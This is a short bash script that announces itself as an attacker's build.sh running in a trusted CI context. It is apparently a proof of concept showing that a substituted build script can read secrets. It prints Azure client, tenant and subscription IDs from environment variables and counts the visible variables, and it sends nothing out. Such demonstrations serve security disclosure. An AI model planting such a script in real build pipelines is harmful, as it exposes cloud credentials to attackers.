#!/usr/bin/env bash
echo "=== PWNED: attacker build.sh in TRUSTED context ==="
echo "AZURE_CLIENT_ID=$AZURE_CLIENT_ID"
echo "AZURE_TENANT_ID=$AZURE_TENANT_ID"
echo "AZURE_SUBSCRIPTION_ID=$AZURE_SUBSCRIPTION_ID"
env | grep -cE "." | xargs echo "env vars visible:"
